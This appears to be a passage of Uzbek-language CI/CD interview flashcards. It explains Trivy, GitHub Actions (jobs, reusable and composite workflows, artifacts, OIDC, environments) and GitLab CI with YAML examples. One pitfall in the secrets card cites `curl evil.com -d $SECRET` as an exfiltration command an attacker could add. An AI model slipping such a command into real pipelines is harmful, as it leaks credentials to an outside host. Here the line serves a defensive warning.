Skaner — xavfsizlik to'ri, asosiy yechim emas.</p>	lvl::Junior dom::cicd sec::h11 CI_CD_fundamentals
Interview Drill::CI/CD::H11 CI/CD fundamentals	idrill-40600	<p>Trivy nima?</p>	<p><b>Qisqa javob:</b> Trivy — Aqua Security'ning ochiq kodli, bitta binary'dagi keng qamrovli skaneri: container image va fayl tizimida CVE'lar (OS paketlari va til dependency'lari), IaC misconfiguration (Terraform, K8s, Dockerfile), secret'lar, litsenziyalar, SBOM yaratish, Kubernetes klasterini skanerlash.</p><p><b>Qanday ishlaydi:</b></p><pre>target (image / fs / repo / k8s / sbom)<br>   -&gt; paketlarni aniqlash (apk, dpkg, rpm, go.sum, package-lock ...)<br>   -&gt; zaiflik bazasi (trivy-db, har 6 soatda yangilanadi)<br>   -&gt; moslik: pkg@ver &lt;-&gt; CVE, fixed version<br>   -&gt; hisobot (table, json, sarif, cyclonedx)</pre><p><b>Amalda:</b></p><pre>trivy image --severity HIGH,CRITICAL --ignore-unfixed --exit-code 1 ghcr.io/acme/api:1.4.2<br>trivy fs --scanners vuln,secret,misconfig .<br>trivy config ./terraform<br>trivy k8s --report summary cluster<br>trivy image --format cyclonedx -o sbom.json ghcr.io/acme/api:1.4.2</pre><p>Chiqish:</p><pre>ghcr.io/acme/api:1.4.2 (alpine 3.20.1)<br>Total: 2 (HIGH: 1, CRITICAL: 1)<br>| Library | Vulnerability  | Severity | Installed | Fixed  |<br>| openssl | CVE-2024-xxxxx | CRITICAL | 3.3.0-r2  | 3.3.1-r0 |</pre><pre>- uses: aquasecurity/trivy-action@0.28.0<br>  with: { image-ref: 'ghcr.io/acme/api:${{ github.sha }}', severity: 'CRITICAL,HIGH', exit-code: '1', format: sarif, output: trivy.sarif }</pre><p><b>Tuzoqlar:</b></p><ul><li><code>--ignore-unfixed</code> siz — tuzatishi yo'q CVE'lar bilan pipeline doim qizil.</li><li>Har job'da DB yuklash — rate limit; DB'ni cache'la yoki mirror (<code>--db-repository</code>) qil.</li><li>Faqat build vaqtida skanerlash — 1 oydan keyin yangi CVE chiqadi; registry/klasterni muntazam qayta skanerla (Trivy Operator).</li><li><code>.trivyignore</code> ga sababsiz qo'shish.</li></ul><p><b>Senior nuqta:</b> Image'ni kichraytirish (distroless, scratch) CVE sonini triage'dan ko'ra samaraliroq kamaytiradi. Trivy'ni build gate + runtime monitoring sifatida ishlat, natijalarni VEX bilan &quot;ta'sir qilmaydi&quot; deb izohla.</p>	lvl::Junior dom::cicd sec::h11 CI_CD_fundamentals
Interview Drill::CI/CD::H12 GHA, GitLab & Jenkins deep dive	idrill-40601	<p>GitHub Actions workflow nima?</p>	<p><b>Qisqa javob:</b> GitHub Actions workflow — <code>.github/workflows/</code> papkasidagi YAML fayl bilan ta'riflangan avtomatik jarayon. U hodisa (<code>push</code>, <code>pull_request</code>, <code>schedule</code>, <code>workflow_dispatch</code>) bilan ishga tushadi va bir yoki bir nechta job'dan iborat; har job runner'da step'larni bajaradi.</p><p><b>Tuzilma:</b></p><pre>workflow (ci.yml)<br>  on: hodisalar<br>  permissions / env / concurrency<br>  jobs:<br>    lint  (runner: ubuntu)  -&gt; steps: checkout, run ...<br>    test  (needs: lint)     -&gt; steps ...<br>    build (needs: test)     -&gt; steps ...</pre><p><b>Amalda:</b></p><pre>name: ci<br>on:<br>  push: { branches: [main] }<br>  pull_request:<br>  workflow_dispatch:<br>permissions: { contents: read }<br>concurrency:<br>  group: ci-${{ github.ref }}<br>  cancel-in-progress: true<br>jobs:<br>  test:<br>    runs-on: ubuntu-latest<br>    timeout-minutes: 15<br>    steps:<br>      - uses: actions/checkout@v4<br>      - uses: actions/setup-go@v5<br>        with: { go-version-file: go.mod, cache: true }<br>      - run: go test -race ./...</pre><p>Natija: repo -&gt; Actions tab -&gt; run -&gt; job -&gt; step log'lari. CLI: <code>gh run list</code>, <code>gh run watch</code>, <code>gh run view --log-failed</code>.</p><p><b>Asosiy tushunchalar:</b> | Tushuncha | Ma'nosi | |---|---| | Event | Nima ishga tushiradi | | Job | Bitta runner'dagi step'lar | | Step | <code>run:</code> (shell) yoki <code>uses:</code> (action) | | Action | Qayta ishlatiladigan step (marketplace) | | Runner | Bajaruvchi mashina | | Context | <code>github</code>, <code>env</code>, <code>secrets</code>, <code>matrix</code> ... |</p><p><b>Tuzoqlar:</b></p><ul><li><code>permissions</code> yo'q — default <code>GITHUB_TOKEN</code> keng huquqli bo'lishi mumkin.</li><li><code>timeout-minutes</code> yo'q — osilgan job 6 soat yeydi.</li><li>Third-party action'lar <code>@main</code> bilan — har kuni boshqa kod.</li></ul><p><b>Senior nuqta:</b> Workflow'ni yupqa qil: mantiq <code>Makefile</code>/skriptda, YAML faqat trigger va orkestratsiya. Third-party action'larni commit SHA bilan pin qil.</p>	lvl::Middle dom::cicd sec::h12 GHA_GitLab_Jenkins_deep_dive
Interview Drill::CI/CD::H12 GHA, GitLab & Jenkins deep dive	idrill-40602	<p>GitHub Actions'da job va step farqi.</p>	<p><b>Qisqa javob:</b> Job — bitta runner (VM yoki konteyner) ichida ketma-ket bajariladigan step'lar to'plami; job'lar default parallel ishlaydi va bir-biridan izolyatsiyalangan. Step — job ichidagi bitta vazifa: shell buyruq (<code>run</code>) yoki action (<code>uses</code>); step'lar bir fayl tizimi va environment'ni bo'lishadi.</p><p><b>Farq:</b> | | Job | Step | |---|---|---| | Bajarilish | Alohida runner | Job runner'ida | | Tartib | Default parallel, <code>needs</code> bilan ketma-ket | Har doim ketma-ket | | Fayllar | Bo'lishmaydi (artifact kerak) | Bitta workspace | | Ma'lumot uzatish | <code>outputs</code> + <code>needs.&lt;job&gt;.outputs</code> | <code>$GITHUB_ENV</code>, <code>$GITHUB_OUTPUT</code> | | Yiqilsa | Bog'liq job'lar skip | Keyingi step'lar skip |</p><p><b>Qanday ishlaydi:</b></p><pre>job: build (VM-1)            job: lint (VM-2)   &lt;- parallel<br>  step1 checkout<br>  step2 go build -&gt; ./bin    (VM-2 ./bin ni ko'rmaydi!)<br>  step3 echo &quot;v=1.2&quot; &gt;&gt; $GITHUB_OUTPUT<br>job: deploy (VM-3, needs: build) -&gt; needs.build.outputs.version</pre><p><b>Amalda:</b></p><pre>jobs:<br>  build:<br>    runs-on: ubuntu-latest<br>    outputs:<br>      version: ${{ steps.ver.outputs.version }}<br>    steps:<br>      - uses: actions/checkout@v4<br>      - id: ver<br>        run: echo &quot;version=$(git describe --tags --always)&quot; &gt;&gt; &quot;$GITHUB_OUTPUT&quot;<br>      - run: echo &quot;BUILD_TIME=$(date -u +%s)&quot; &gt;&gt; &quot;$GITHUB_ENV&quot;<br>      - run: echo &quot;built at $BUILD_TIME&quot;     # keyingi step ko'radi<br>  deploy:<br>    needs: build<br>    runs-on: ubuntu-latest<br>    steps:<br>      - run: echo &quot;deploying ${{ needs.build.outputs.version }}&quot;</pre><p><b>Tuzoqlar:</b></p><ul><li>Bir step'da <code>export VAR=x</code> — keyingi step ko'rmaydi (har step yangi shell); <code>$GITHUB_ENV</code> ishlat.</li><li>Job'ni juda mayda bo'lish — har job checkout va setup qayta (vaqt).</li><li>Eskirgan <code>::set-output</code> sintaksisi — o'chirilgan, <code>$GITHUB_OUTPUT</code> ishlat.</li></ul><p><b>Senior nuqta:</b> Job chegarasi = izolyatsiya va parallelizm chegarasi. Turli huquq kerak bo'lgan ishlarni (build vs deploy) alohida job'ga ajrat — <code>permissions</code> va <code>environment</code> job darajasida beriladi.</p>	lvl::Middle dom::cicd sec::h12 GHA_GitLab_Jenkins_deep_dive
Interview Drill::CI/CD::H12 GHA, GitLab & Jenkins deep dive	idrill-40603	<p>GitHub Actions'da reusable workflow nima?</p>	<p><b>Qisqa javob:</b> Reusable workflow — <code>on: workflow_call</code> bilan e'lon qilingan workflow; boshqa workflow uni job sifatida <code>uses: org/repo/.github/workflows/x.yml@ref</code> orqali chaqiradi. Butun pipeline'ni (bir nechta job, environment, secret bilan) qayta ishlatish va tashkilot standartlarini markazlashtirish uchun.</p><p><b>Muammo:</b> 80 ta repo'da bir xil build-scan-deploy YAML nusxasi. Xavfsizlik qadami qo'shish kerak — 80 PR.</p><p><b>Qanday ishlaydi:</b></p><pre>app-repo/.github/workflows/ci.yml<br>   jobs.release.uses: acme/platform/.github/workflows/go-release.yml@v3<br>                                     |<br>platform-repo: go-release.yml (on: workflow_call)<br>   inputs, secrets -&gt; jobs: test, build, scan, sign, deploy</pre><p><b>Amalda:</b></p><pre># acme/platform/.github/workflows/go-release.yml<br>on:<br>  workflow_call:<br>    inputs:<br>      service: { type: string, required: true }<br>      go-version: { type: string, default: '1.23' }<br>    secrets:<br>      REGISTRY_TOKEN: { required: true }<br>    outputs:<br>      digest: { value: '${{ jobs.build.outputs.digest }}' }<br>jobs:<br>  build:<br>    runs-on: ubuntu-latest<br>    outputs: { digest: '${{ steps.b.outputs.digest }}' }<br>    steps:<br>      - uses: actions/checkout@v4<br>      - id: b<br>        run: ./build.sh ${{ inputs.service }}</pre><pre># chaqiruvchi<br>jobs:<br>  release:<br>    uses: acme/platform/.github/workflows/go-release.yml@v3<br>    with: { service: api }<br>    secrets: { REGISTRY_TOKEN: '${{ secrets.REGISTRY_TOKEN }}' }</pre><p><b>Composite action'dan farqi:</b> reusable workflow — job darajasida (bir nechta job, o'z runner'i, environment); composite action — step darajasida.</p><p><b>Tuzoqlar:</b></p><ul><li>Ichma-ich chaqiruv chegarasi bor (hozir 10 daraja) va bitta workflow'dan chaqiriladigan reusable workflow'lar soni cheklangan.</li><li><code>env</code> kontekst chaqiruvchidan o'tmaydi — <code>inputs</code> orqali ber.</li><li><code>@main</code> ga bog'lash — platforma o'zgarishi hamma repo'ni birdan buzadi; tag/SHA ishlat.</li></ul><p><b>Senior nuqta:</b> Required workflows / repository rulesets bilan birlashtirilsa, tashkilot bo'yicha majburiy xavfsizlik bosqichlarini o'rnatish mumkin. Versiyalashni SemVer tag'lari bilan qil va changelog yurit.</p>	lvl::Middle dom::cicd sec::h12 GHA_GitLab_Jenkins_deep_dive
Interview Drill::CI/CD::H12 GHA, GitLab & Jenkins deep dive	idrill-40604	<p>GitHub Actions'da composite action nima?</p>	<p><b>Qisqa javob:</b> Composite action — bir nechta step'ni (<code>run</code> va boshqa <code>uses</code>) bitta qayta ishlatiladigan step'ga birlashtiruvchi custom action. <code>action.yml</code> faylida <code>runs.using: composite</code> bilan e'lon qilinadi; Docker yoki JavaScript yozish shart emas.</p><p><b>Muammo:</b> Har job'da bir xil 5 step: checkout, setup-go, cache, <code>go mod download</code>, lint tool o'rnatish. Composite action ularni bitta <code>uses: ./.github/actions/setup-go-env</code> ga aylantiradi.</p><p><b>Qanday ishlaydi:</b></p><pre>job (runner)<br>  step: uses ./.github/actions/setup<br>          -&gt; step a: setup-go<br>          -&gt; step b: cache<br>          -&gt; step c: run go mod download<br>  step: run make test      (bir xil runner va workspace)</pre><p><b>Amalda:</b></p><pre># .github/actions/setup/action.yml<br>name: Setup Go env<br>description: Go, cache va tool'larni o'rnatadi<br>inputs:<br>  go-version: { description: Go versiya, default: '1.23' }<br>outputs:<br>  cache-hit: { description: cache topildimi, value: '${{ steps.c.outputs.cache-hit }}' }<br>runs:<br>  using: composite<br>  steps:<br>    - uses: actions/setup-go@v5<br>      with: { go-version: '${{ inputs.go-version }}' }<br>    - id: c<br>      uses: actions/cache@v4<br>      with:<br>        path: ~/go/pkg/mod<br>        key: gomod-${{ hashFiles('**/go.sum') }}<br>    - run: go mod download<br>      shell: bash</pre><pre>steps:<br>  - uses: actions/checkout@v4      # lokal action uchun avval checkout shart<br>  - uses: ./.github/actions/setup<br>    with: { go-version: '1.23' }</pre><p><b>Tuzoqlar:</b></p><ul><li><code>run</code> step'larida <code>shell:</code> majburiy — yozilmasa xato.</li><li>Composite action ichida <code>secrets</code> kontekstiga to'g'ridan-to'g'ri kirish yo'q — <code>inputs</code> orqali ber.</li><li>Log'da composite ichidagi step'lar bitta guruh bo'lib ko'rinadi — debug qiyinroq.</li></ul><p><b>Senior nuqta:</b> Step darajasidagi takrorlash — composite action; butun pipeline takrorlanishi — reusable workflow. Alohida repo'da versiyalab (<code>acme/actions/setup@v2</code>) tarqat.</p>	lvl::Middle dom::cicd sec::h12 GHA_GitLab_Jenkins_deep_dive
Interview Drill::CI/CD::H12 GHA, GitLab & Jenkins deep dive	idrill-40605	<p>GitHub Actions'da job'lar orasida fayllarni qanday uzatasiz?</p>	<p><b>Qisqa javob:</b> Job'lar alohida runner'larda ishlaydi, fayl tizimi umumiy emas. Fayl uzatish: A job'da <code>actions/upload-artifact</code>, B job'da (<code>needs: A</code> bilan) <code>actions/download-artifact</code>. Kichik qiymatlar (versiya, digest) uchun esa job <code>outputs</code>.</p><p><b>Qanday ishlaydi:</b></p><pre>job build (VM-1): go build -&gt; dist/app -&gt; upload-artifact (name: app)<br>                                              |<br>                                    GitHub artifact storage<br>                                              |<br>job test-e2e (VM-2, needs: build) -&gt; download-artifact (name: app) -&gt; dist/app</pre><p><b>Amalda:</b></p><pre>jobs:<br>  build:<br>    runs-on: ubuntu-latest<br>    steps:<br>      - uses: actions/checkout@v4<br>      - run: go build -o dist/app ./cmd/app<br>      - uses: actions/upload-artifact@v4<br>        with:<br>          name: app-binary<br>          path: dist/app<br>          retention-days: 3<br>          if-no-files-found: error<br>  e2e:<br>    needs: build<br>    runs-on: ubuntu-latest<br>    steps:<br>      - uses: actions/download-artifact@v4<br>        with: { name: app-binary, path: dist }<br>      - run: chmod +x dist/app &amp;&amp; ./dist/app --selftest</pre><p>Boshqa variantlar: Docker image'ni registry'ga push qilib keyingi job'da pull; katta fayllar uchun S3.</p><p><b>Tuzoqlar:</b></p><ul><li>Artifact fayl ruxsatlarini (execute bit) saqlamaydi — <code>chmod +x</code> yoki tar qilib yukla.</li><li><code>upload-artifact@v4</code> da bir run ichida bir xil <code>name</code> ga ikki marta yuklab bo'lmaydi (v3 da mumkin edi); matrix'da nomga <code>matrix</code> qiymatini qo'sh.</li><li>v3 action'lar o'chirilgan — v4 ga o'tish shart.</li><li>Cache'ni fayl uzatish uchun ishlatish — kafolat yo'q.</li></ul><p><b>Senior nuqta:</b> Artifact — bitta run ichidagi uzatish; muhitlar bo'ylab promote qilinadigan narsa registry'da bo'lsin. Katta artifact'lar saqlash xarajatini oshiradi — <code>retention-days</code> ni qisqa qo'y.</p>	lvl::Middle dom::cicd sec::h12 GHA_GitLab_Jenkins_deep_dive
Interview Drill::CI/CD::H12 GHA, GitLab & Jenkins deep dive	idrill-40606	<p>GitHub Actions'da AWS bilan OIDC qanday sozlanadi?</p>	<p><b>Qisqa javob:</b> GitHub Actions'ni AWS'ga OIDC bilan ulash: AWS'da GitHub OIDC identity provider va trust policy'li IAM rol yaratiladi; workflow'da <code>permissions: id-token: write</code> beriladi va <code>aws-actions/configure-aws-credentials</code> rolni assume qilib vaqtinchalik credential oladi. Statik access key kerak emas.</p><p><b>Qanday ishlaydi:</b></p><pre>job -&gt; GitHub OIDC: JWT (sub=repo:acme/api:environment:prod, aud=sts.amazonaws.com)<br>    -&gt; AWS STS AssumeRoleWithWebIdentity<br>    -&gt; trust policy: issuer, aud, sub tekshiriladi<br>    -&gt; 1 soatlik AccessKey/Secret/SessionToken -&gt; env'ga</pre><p><b>Amalda:</b></p><ol><li>AWS'da provider (bir marta, Terraform):</li></ol><pre>resource &quot;aws_iam_openid_connect_provider&quot; &quot;github&quot; {<br>  url            = &quot;https://token.actions.githubusercontent.com&quot;<br>  client_id_list = [&quot;sts.amazonaws.com&quot;]<br>}</pre><ol><li>Rol trust policy:</li></ol><pre>&quot;Condition&quot;: {<br>  &quot;StringEquals&quot;: {<br>    &quot;token.actions.githubusercontent.com:aud&quot;: &quot;sts.amazonaws.com&quot;,<br>    &quot;token.actions.githubusercontent.com:sub&quot;: &quot;repo:acme/api:environment:production&quot;<br>  }<br>}</pre><ol><li>Workflow:</li></ol><pre>permissions: { id-token: write, contents: read }<br>jobs:<br>  deploy:<br>    environment: production<br>    runs-on: ubuntu-latest<br>    steps:<br>      - uses: aws-actions/configure-aws-credentials@v4<br>        with:<br>          role-to-assume: arn:aws:iam::123456789012:role/gha-api-deploy<br>          aws-region: eu-central-1<br>      - run: aws sts get-caller-identity</pre><p><code>get-caller-identity</code> chiqishida <code>assumed-role/gha-api-deploy/GitHubActions</code> ko'rinsa — ishladi.</p><p><b>Tuzoqlar:</b></p><ul><li><code>sub</code> shartisiz yoki <code>StringLike &quot;repo:acme/*&quot;</code> — har repo, har branch, PR ham prod rolini oladi.</li><li><code>id-token: write</code> faqat kerakli job'da bo'lsin, workflow darajasida emas.</li><li>Xato <code>Not authorized to perform sts:AssumeRoleWithWebIdentity</code> — odatda <code>sub</code> mos emas; token claim'larini tekshir (environment ishlatilsa <code>sub</code> formati o'zgaradi).</li></ul><p><b>Senior nuqta:</b> Har muhit uchun alohida rol va minimal policy. CloudTrail'da session nomi orqali qaysi run qaysi API'ni chaqirganini kuzatish mumkin — audit uchun <code>role-session-name</code> ga run ID qo'y.</p>	lvl::Middle dom::cicd sec::h12 GHA_GitLab_Jenkins_deep_dive
Interview Drill::CI/CD::H12 GHA, GitLab & Jenkins deep dive	idrill-40607	<p>GitHub Actions'da <code>needs</code> nima?</p>	<p><b>Qisqa javob:</b> <code>needs</code> — job'lar orasidagi bog'liqlik: <code>needs: [build, test]</code> bo'lsa, job faqat <code>build</code> va <code>test</code> muvaffaqiyatli tugagach boshlanadi. U job'lardan DAG (yo'naltirilgan graf) yasaydi va oldingi job'ning <code>outputs</code> iga kirish beradi.</p><p><b>Qanday ishlaydi:</b></p><pre>  lint ----+<br>           +--&gt; build ---&gt; deploy-staging ---&gt; deploy-prod<br>  test ----+<br>(lint va test parallel; build ikkalasini kutadi)</pre><p><b>Amalda:</b></p><pre>jobs:<br>  lint: { runs-on: ubuntu-latest, steps: [ { run: make lint } ] }<br>  test: { runs-on: ubuntu-latest, steps: [ { run: make test } ] }<br>  build:<br>    needs: [lint, test]<br>    runs-on: ubuntu-latest<br>    outputs: { tag: '${{ steps.t.outputs.tag }}' }<br>    steps:<br>      - id: t<br>        run: echo &quot;tag=${GITHUB_SHA::7}&quot; &gt;&gt; &quot;$GITHUB_OUTPUT&quot;<br>  notify:<br>    needs: [build]<br>    if: always()          # build yiqilsa ham ishlaydi<br>    runs-on: ubuntu-latest<br>    steps:<br>      - run: echo &quot;build natijasi: ${{ needs.build.result }}, tag: ${{ needs.build.outputs.tag }}&quot;</pre><p><code>needs.&lt;job&gt;.result</code> qiymatlari: <code>success</code>, <code>failure</code>, <code>cancelled</code>, <code>skipped</code>.</p><p><b>Status funksiyalari:</b> | <code>if:</code> | Qachon ishlaydi | |---|---| | (yo'q) = <code>success()</code> | Hamma <code>needs</code> muvaffaqiyatli | | <code>always()</code> | Har doim (bekor qilinsa ham) | | <code>failure()</code> | Biror oldingi yiqilsa | | <code>!cancelled()</code> | Bekor qilinmagan bo'lsa |</p><p><b>Tuzoqlar:</b></p><ul><li>Oldingi job <code>skipped</code> bo'lsa, bog'liq job ham skip — zanjir bo'ylab tarqaladi. <code>if: ${{ !failure() &amp;&amp; !cancelled() }}</code> bilan yechiladi.</li><li><code>always()</code> deploy job'ida — build yiqilsa ham deploy urinadi.</li><li>Juda uzun ketma-ket zanjir — parallelizm yo'qoladi, pipeline sekin.</li></ul><p><b>Senior nuqta:</b> <code>needs</code> grafini kritik yo'l (critical path) nuqtai nazaridan loyihala: mustaqil tekshiruvlar parallel, faqat haqiqiy bog'liqlik ketma-ket.</p>	lvl::Middle dom::cicd sec::h12 GHA_GitLab_Jenkins_deep_dive
Interview Drill::CI/CD::H12 GHA, GitLab & Jenkins deep dive	idrill-40608	<p>Matrix build'da <code>fail-fast</code> nima?</p>	<p><b>Qisqa javob:</b> <code>fail-fast</code> — <code>strategy</code> ostidagi sozlama: <code>true</code> (default) bo'lsa, matrix'dagi bitta job yiqilishi bilan qolgan ishlayotgan va navbatdagi matrix job'lar bekor qilinadi. <code>false</code> bo'lsa, hammasi oxirigacha ishlaydi va qaysi kombinatsiyalar buzilgani to'liq ko'rinadi.</p><p><b>Qanday ishlaydi:</b></p><pre>matrix: node [20, 22, 24] x os [ubuntu, windows]<br>fail-fast: true<br>  (ubuntu,20) FAIL -&gt; qolgan 5 job: cancelled<br>  natija: faqat bitta xato ko'rinadi, resurs tejaldi<br>fail-fast: false<br>  (ubuntu,20) FAIL, (windows,20) FAIL, boshqalar OK<br>  natija: &quot;Node 20 da muammo&quot; degan aniq rasm</pre><p><b>Amalda:</b></p><pre>jobs:<br>  test:<br>    runs-on: ${{ matrix.os }}<br>    strategy:<br>      fail-fast: false<br>      max-parallel: 3<br>      matrix:<br>        os: [ubuntu-latest, windows-latest]<br>        node: [20, 22, 24]<br>    continue-on-error: ${{ matrix.node == 24 }}  # eksperimental versiya<br>    steps:<br>      - uses: actions/checkout@v4<br>      - uses: actions/setup-node@v4<br>        with: { node-version: '${{ matrix.node }}' }<br>      - run: npm ci &amp;&amp; npm test</pre><p>GitLab'da ekvivalent tushuncha yo'q (har parallel job mustaqil); Jenkins'da <code>parallel</code> + <code>failFast true</code>.</p><p><b>Qachon qaysi:</b> | Holat | Tanlov | |---|---| | PR, tez feedback, qimmat runner | <code>true</code> | | Kutubxona compat testi, nightly | <code>false</code> | | Flaky platforma (Windows) | <code>false</code> + <code>continue-on-error</code> |</p><p><b>Tuzoqlar:</b></p><ul><li><code>fail-fast: true</code> bilan bitta flaky job hamma natijani yashiradi.</li><li><code>continue-on-error</code> bilan yiqilgan job yashil ko'rinadi — buni &quot;ishlayapti&quot; deb o'ylash.</li><li><code>fail-fast</code> faqat matrix ichida ishlaydi, boshqa job'larga ta'sir qilmaydi.</li></ul><p><b>Senior nuqta:</b> Default'ga ko'r-ko'rona ishonma: debug qilish uchun to'liq rasm kerakmi yoki tez to'xtashmi — vaziyatga qarab tanla.</p>	lvl::Middle dom::cicd sec::h12 GHA_GitLab_Jenkins_deep_dive
Interview Drill::CI/CD::H12 GHA, GitLab & Jenkins deep dive	idrill-40609	<p>GitHub Actions environment va protection rule'lar nima?</p>	<p><b>Qisqa javob:</b> Environment — GitHub'da deploy maqsadini ifodalovchi nomlangan obyekt (<code>staging</code>, <code>production</code>). Unga protection rule'lar qo'yiladi: required reviewers (qo'lda tasdiq), wait timer, qaysi branch/tag deploy qila olishi, custom deployment protection rule'lar. Environment'ning o'z secret va variable'lari bor — faqat o'sha environment'ga deploy qiluvchi job ularni ko'radi.</p><p><b>Qanday ishlaydi:</b></p><pre>job deploy-prod (environment: production)<br>   -&gt; branch ruxsat etilganmi? (faqat main / v* tag)<br>   -&gt; wait timer (masalan 10 daqiqa)<br>   -&gt; required reviewers: @acme/sre dan 1 kishi Approve<br>   -&gt; shundan keyin job boshlanadi va production secret'larini oladi</pre><p><b>Amalda:</b></p><pre>jobs:<br>  deploy-prod:<br>    runs-on: ubuntu-latest<br>    environment:<br>      name: production<br>      url: https://api.example.com<br>    steps:<br>      - run: ./deploy.sh<br>        env:<br>          DB_PASSWORD: ${{ secrets.DB_PASSWORD }}   # production environment secret</pre><p>Sozlash: Settings -&gt; Environments -&gt; production -&gt; Required reviewers, Prevent self-review, Deployment branches and tags: <code>main</code>.</p><pre>gh api repos/acme/api/environments/production</pre><p>Repo'ning &quot;Deployments&quot; bo'limida har environment'ga qachon, qaysi commit chiqqani tarixi ko'rinadi.</p><p><b>Tuzoqlar:</b></p><ul><li>Prod secret'larini repo-level secret'ga qo'yish — har workflow (hatto PR) ularni o'qiy oladi. Environment secret'lari ishlat.</li><li>Branch cheklovi yo'q — feature branch'dan prod'ga deploy.</li><li>&quot;Prevent self-review&quot; o'chiq — dasturchi o'z deploy'ini o'zi tasdiqlaydi.</li><li>Private repo'larda ba'zi protection rule'lar faqat ma'lum tariflarda mavjud.</li></ul><p><b>Senior nuqta:</b> Environment'ni OIDC bilan bog'la: AWS trust policy <code>sub: repo:acme/api:environment:production</code> — shunda prod credential'larini faqat tasdiqlangan job oladi. Bu ikki mustaqil himoya qatlamini birlashtiradi.</p>	lvl::Middle dom::cicd sec::h12 GHA_GitLab_Jenkins_deep_dive
Interview Drill::CI/CD::H12 GHA, GitLab & Jenkins deep dive	idrill-40610	<p>Reusable workflow'ga secret'larni qanday xavfsiz uzatasiz?</p>	<p><b>Qisqa javob:</b> Reusable workflow'ga secret'lar avtomatik o'tmaydi. Ikki usul: <code>secrets: inherit</code> — chaqiruvchining barcha secret'lari o'tadi (qulay, lekin keng); yoki aniq ro'yxat — <code>secrets: { DB_PASSWORD: ${{ secrets.DB_PASS }} }</code>, chaqiriluvchi <code>on.workflow_call.secrets</code> da e'lon qiladi. Least privilege uchun aniq uzatish afzal.</p><p><b>Qanday ishlaydi:</b></p><pre>caller (app repo) secrets: DB_PASS, NPM_TOKEN, SLACK_URL, AWS_KEY<br>   |<br>   +-- secrets: inherit       -&gt; hammasi (4 ta) reusable'ga<br>   +-- secrets: DB_PASSWORD   -&gt; faqat bittasi, nomi ham o'zgartirilishi mumkin</pre><p><b>Amalda:</b></p><pre># chaqiriluvchi: acme/platform/.github/workflows/deploy.yml<br>on:<br>  workflow_call:<br>    secrets:<br>      DB_PASSWORD:<br>        required: true<br>        description: Migratsiya uchun<br>jobs:<br>  migrate:<br>    runs-on: ubuntu-latest<br>    steps:<br>      - run: ./migrate.sh<br>        env: { DB_PASSWORD: '${{ secrets.DB_PASSWORD }}' }</pre><pre># chaqiruvchi<br>jobs:<br>  deploy:<br>    uses: acme/platform/.github/workflows/deploy.yml@v2<br>    secrets:<br>      DB_PASSWORD: ${{ secrets.PROD_DB_PASS }}</pre><p>Environment secret'lari: reusable workflow ichidagi job <code>environment:</code> ni e'lon qilsa, o'sha environment secret'larini o'zi oladi.</p><p><b>Tuzoqlar:</b></p><ul><li><code>secrets: inherit</code> + tashqi (boshqa tashkilot) reusable workflow — barcha secret'laringizni begona kodga berasiz. <code>inherit</code> faqat bir tashkilot ichida ishlaydi, lekin ichki repo ham buzilishi mumkin.</li><li>Reusable workflow'ni <code>@main</code> bilan chaqirish — kimdir u yerga <code>curl evil.com -d $SECRET</code> qo'shsa.</li><li>Secret nomlari chaqiruvchida boshqa — mapping noto'g'ri, bo'sh qiymat jim o'tadi; <code>required: true</code> qo'y.</li></ul><p><b>Senior nuqta:</b> Eng yaxshisi — secret umuman uzatmaslik: reusable workflow OIDC bilan o'zi credential olsin. Uzatish kerak bo'lsa — aniq ro'yxat va reusable workflow'ni SHA bilan pin.</p>	lvl::Middle dom::cicd sec::h12 GHA_GitLab_Jenkins_deep_dive
Interview Drill::CI/CD::H12 GHA, GitLab & Jenkins deep dive	idrill-40611	<p><code>.gitlab-ci.yml</code> arxitekturasi qanday?</p>	<p><b>Qisqa javob:</b> <code>.gitlab-ci.yml</code> — repo ildizidagi GitLab CI/CD pipeline ta'rifi. Asosiy bloklar: <code>stages</code> (tartib), job'lar (<code>script</code>, <code>image</code>, <code>rules</code>, <code>needs</code>), <code>variables</code>, <code>default</code>, <code>cache</code>/<code>artifacts</code>, <code>include</code> (boshqa fayllar), <code>workflow</code> (pipeline qachon yaratilishi). GitLab Runner job'larni bajaradi.</p><p><b>Tuzilma:</b></p><pre>.gitlab-ci.yml<br>  workflow:rules   -&gt; pipeline umuman yaratiladimi<br>  include          -&gt; shablonlar<br>  default          -&gt; hamma job uchun image, before_script, retry<br>  variables<br>  stages: [lint, test, build, deploy]<br>  job'lar: stage + script + rules + needs + artifacts + environment</pre><p><b>Amalda:</b></p><pre>workflow:<br>  rules:<br>    - if: $CI_PIPELINE_SOURCE == &quot;merge_request_event&quot;<br>    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH<br><br>default:<br>  image: golang:1.23<br>  interruptible: true<br><br>stages: [test, build, deploy]<br><br>test:<br>  stage: test<br>  script: [ go test -race ./... ]<br><br>build:<br>  stage: build<br>  image: docker:27<br>  services: [ docker:27-dind ]<br>  script:<br>    - docker build -t $CI_REGISTRY_IMAGE:$CI_COMMIT_SHA .<br>    - docker push $CI_REGISTRY_IMAGE:$CI_COMMIT_SHA<br><br>deploy_prod:<br>  stage: deploy<br>  environment: { name: production, url: https://api.example.com }<br>  resource_group: production<br>  rules:<br>    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH<br>      when: manual<br>  script: [ ./deploy.sh $CI_COMMIT_SHA ]</pre><p>Tekshirish: GitLab UI -&gt; Build -&gt; Pipeline editor (validate, merged YAML ko'rinishi); CLI: <code>glab ci lint</code>.</p><p><b>Tuzoqlar:</b></p><ul><li><code>workflow:rules</code> siz — MR va branch uchun ikki pipeline (duplicate).</li><li><code>only/except</code> (eski) va <code>rules</code> ni bir job'da aralashtirish — ruxsat yo'q.</li><li>Ichki registry, environment va variable'lar nativ — GitHub'dan ko'chirishda bularni qayta sozlash kerak.</li></ul><p><b>Senior nuqta:</b> Katta tashkilotda <code>include</code> bilan markaziy shablonlar va CI/CD Components (catalog) ishlat; compliance pipeline orqali majburiy job'larni loyiha egasi o'chira olmasin.</p>	lvl::Middle dom::cicd sec::h12 GHA_GitLab_Jenkins_deep_dive
